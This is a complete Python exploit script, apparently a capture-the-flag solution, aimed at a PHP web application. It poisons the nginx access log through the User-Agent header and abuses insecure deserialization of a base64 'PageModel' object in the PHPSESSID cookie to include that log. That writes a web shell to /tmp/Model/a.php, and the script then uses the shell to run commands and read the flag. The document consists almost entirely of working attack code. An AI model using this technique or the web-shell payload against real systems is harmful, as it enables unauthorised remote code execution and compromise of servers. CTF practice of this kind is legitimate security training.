#!/usr/bin/python3

from base64 import b64encode as b64
import requests 
import sys

def b64str(serialized_str):
    return b64(serialized_str.encode('utf-8')).decode('utf-8')

if len(sys.argv) < 3:
    print("Usage {} <IP> <PORT>".format(sys.argv[0]))
    exit()
    
host, port = sys.argv[1],sys.argv[2]
shell_file, log_file = '/tmp/Model/a.php', '/var/log/nginx/access.log'

#PHP code that will be written to access.log, then exec'd on include()
php_shell_cmd = f'mkdir /tmp/Model; echo \'<?php echo system($_GET[cmd]) ?>\' > {shell_file}'

#Encode the command to b64 for ease
b64_cmd = b64str(php_shell_cmd)

#The entire command that will fill the User-Agent string
log_php_poison = f'<?php system(base64_decode(\'{b64_cmd}\'));?>'

#Create malformed PHP object pointing to a file we will create/own (/tmp/Model/a.php) from the log poisoning
serialized_php_obj = 'O:9:"PageModel":1:{{s:4:"file";s:{}:"{}";}}'.format( len(log_file), log_file )

#The web app expects the PHP serialized object to be b64 encoded
b64_obj = b64str(serialized_php_obj)

#First shot: inject PHP code into the access.log file
res = requests.get(f'http://{host}:{port}/index.php', headers = { "User-Agent": log_php_poison , "Connection":"close"} , cookies = { "PHPSESSID": b64_obj } )
#Second shot: Same request, but will execute PHP code we injected last request
res = requests.get(f'http://{host}:{port}/index.php', headers = { "User-Agent": log_php_poison , "Connection":"close"}, cookies = { "PHPSESSID": b64_obj } )

#Build another malformed PHP object pointing to the upload PHP shell (/tmp/Model/a.php)
serialized_str = 'O:9:"PageModel":1:{{s:4:"file";s:{}:"{}";}}'.format(len(shell_file),shell_file)
serialized_php_obj = b64str(serialized_str)

#Get dat flag
shell_res = requests.get(f'http://{host}:{port}/a?cmd=cat+`ls+/flag*`', cookies = { "PHPSESSID": serialized_php_obj , "Connection":"close"} )
print(shell_res.content)

